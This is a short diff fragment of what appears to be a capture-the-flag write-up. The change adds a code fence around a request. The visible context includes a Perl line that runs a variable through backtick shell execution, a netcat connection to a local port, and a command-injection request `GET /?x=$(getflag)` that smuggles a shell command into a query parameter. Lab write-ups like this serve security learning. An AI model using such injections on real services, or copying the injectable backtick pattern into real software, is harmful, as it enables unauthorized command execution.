@@ -21,6 +21,7 @@ print \`echo $y 2>&1\`;
     ```
     nc localhost 4747
     ```
+    ```
     - GET /?x=$(getflag)
     ```
 
